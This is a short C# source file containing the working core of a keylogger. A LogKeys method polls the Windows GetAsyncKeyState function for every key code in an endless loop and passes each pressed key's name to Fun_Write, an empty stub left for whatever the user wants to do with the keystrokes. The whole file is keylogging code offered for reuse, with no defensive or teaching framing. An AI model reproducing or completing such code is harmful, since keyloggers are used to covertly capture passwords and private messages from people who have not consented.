    using System;
    using System.Collections.Generic;
    using System.Runtime.InteropServices;
    using System.Text;
    using System.Threading;
    using System.Windows.Forms;
    class workThread
    {
        [DllImport("user32.dll")]
        public static extern int GetAsyncKeyState(Int32 i);
        public workThread() {; } //empty constructor
        public void LogKeys() //the function the thread will do when being called
        {
            while (true)
            {
                //sleeping for while, this will reduce load on cpu
                Thread.Sleep(50);
                for (Int32 i = 0; i < 255; i++)
                {
                    int keyState = GetAsyncKeyState(i);
                    if (keyState == 1 || keyState == -32767)
                    {
                        Fun_Write( ((Keys)i).ToString() );
                    }
                }
            }
        }
        public static void Fun_Write(string word)
        {
            //do what you want with the key
        }
    }
